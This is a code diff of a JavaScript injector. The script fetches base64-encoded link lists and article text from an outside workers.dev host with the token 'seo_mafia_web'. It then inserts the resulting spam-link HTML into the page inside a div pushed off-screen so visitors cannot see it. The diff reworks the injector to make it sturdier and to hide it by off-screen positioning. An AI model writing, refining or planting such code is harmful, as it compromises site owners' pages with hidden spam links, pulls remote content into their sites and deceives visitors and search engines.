@@ -1,52 +1,90 @@
 !function(){
 try{
   if(document.getElementById("bunker-payload")) return;
+
   const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
   const TOKEN = "seo_mafia_web";
-  const decode = s => decodeURIComponent(escape(atob(s)));
+
+  const decode = (s) => {
+    try {
+      return new TextDecoder().decode(
+        Uint8Array.from(atob(s), c => c.charCodeAt(0))
+      );
+    } catch(e) {
+      console.error("Decode error:", e);
+      return "";
+    }
+  };
+
   async function getData(id){
-    const r = await fetch(`${API_BASE}/data?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`, {
-      method: "GET",
-      cache: "no-store"
-    });
-    if(!r.ok) throw new Error("Fetch failed: " + r.status);
-    const j = await r.json();
-    if(!j || !j.payload) throw new Error("Invalid payload");
-    return decode(j.payload);
+    try{
+      const res = await fetch(
+        `${API_BASE}/data?id=${encodeURIComponent(id)}&token=${encodeURIComponent(TOKEN)}`,
+        { cache: "no-store" }
+      );
+
+      if(!res.ok) throw new Error("Fetch failed: " + res.status);
+
+      const json = await res.json();
+
+      if(!json || !json.payload) throw new Error("Invalid payload");
+
+      return decode(json.payload);
+
+    }catch(err){
+      console.error("Fetch error ("+id+"):", err);
+      return "";
+    }
   }
+
   Promise.all([
     getData("b1"),
     getData("a1")
   ]).then(([anchorsRaw, articleRaw]) => {
-    if(!anchorsRaw || !articleRaw) return;
+
+    if(!anchorsRaw || !articleRaw){
+      console.warn("Data kosong, inject dibatalkan");
+      return;
+    }
+
     const anchors = anchorsRaw
       .split("\n")
       .map(x => x.trim())
       .filter(Boolean)
       .map(line => {
-        const p = line.split("|");
-        if(p.length < 2) return "";
-        const text = (p[0] || "").trim();
-        const href = (p[1] || "").trim();
-        if(!text || !href) return "";
-        return '<a href="' + href + '">' + text + "</a>";
+        const parts = line.split("|");
+        if(parts.length < 2) return "";
+        return `<a href="${parts[1].trim()}">${parts[0].trim()}</a>`;
       })
       .filter(Boolean);
+
     let i = 0;
     const html = articleRaw.replace(/\{ANCHOR\}/g, () => {
-      if(!anchors.length) return "";
-      return anchors[i++ % anchors.length];
+      return anchors.length ? anchors[i++ % anchors.length] : "";
     });
-    const box = document.createElement("div");
-    box.id = "bunker-payload";
-    box.hidden = true;
-    box.setAttribute("aria-hidden", "true");
-    box.innerHTML = html;
-    (document.body || document.documentElement).appendChild(box);
-  }).catch(err => {
-    console.error("Bunker payload error:", err);
+
+    function inject(){
+      if(document.getElementById("bunker-payload")) return;
+
+      const box = document.createElement("div");
+      box.id = "bunker-payload";
+      box.style.position = "absolute";
+      box.style.left = "-9999px";
+      box.innerHTML = html;
+
+      document.body.appendChild(box);
+      console.log("Inject sukses");
+    }
+
+    if(document.readyState !== "loading"){
+      inject();
+    }else{
+      document.addEventListener("DOMContentLoaded", inject);
+    }
+
   });
+
 }catch(e){
-  console.error("Injector error:", e);
+  console.error("Injector fatal error:", e);
 }
 }();
